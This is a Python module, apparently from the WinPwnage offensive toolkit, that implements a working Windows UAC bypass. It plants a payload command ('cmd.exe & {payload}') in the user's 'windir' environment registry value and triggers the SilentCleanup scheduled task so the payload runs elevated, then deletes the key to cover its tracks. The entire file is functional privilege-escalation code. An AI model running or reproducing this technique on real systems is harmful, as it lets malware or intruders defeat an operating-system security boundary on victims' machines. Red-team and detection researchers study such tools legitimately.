import os
import time
import _winreg
from winpwnage.core.prints import *
from winpwnage.core.utils import *

silentcleanup_info = {
	"Description": "Bypass UAC using silentcleanup and registry key manipulation",
	"Id": "4",
	"Type": "UAC bypass",
	"Fixed In": "999999",
	"Works From": "9600",
	"Admin": False,
	"Function Name": "silentcleanup",
	"Function Payload": True,
}


def silentcleanup_cleanup(path):
	print_info("Performing cleaning")
	if registry().remove_key(hkey="hkcu", path=path, name="windir", delete_key=False):
		print_success("Successfully cleaned up")
	else:
		print_error("Unable to cleanup")
		return False

def silentcleanup(payload):
	if payloads().exe(payload):
		path = "Environment"

		if registry().modify_key(hkey="hkcu", path=path, name="windir", value="cmd.exe & {payload}".format(payload=os.path.join(payload)), create=True):
			print_success("Successfully created WINDIR key containing payload ({payload})".format(payload=os.path.join(payload)))
		else:
			print_error("Unable to create registry keys")
			return False

		time.sleep(5)

		print_info("Disabling file system redirection")
		with disable_fsr():
			print_success("Successfully disabled file system redirection")
			if process().create("schtasks.exe", params="/Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I"):
				print_success("Successfully spawned process ({})".format(os.path.join(payload)))
			else:
				print_error("Unable to spawn process ({})".format(os.path.join(payload)))
				if "error" in Constant.output:
					silentcleanup_cleanup(path)

		time.sleep(5)
		
		if not silentcleanup_cleanup(path):
			print_success("All done!")
	else:
		print_error("Cannot proceed, invalid payload")
		return False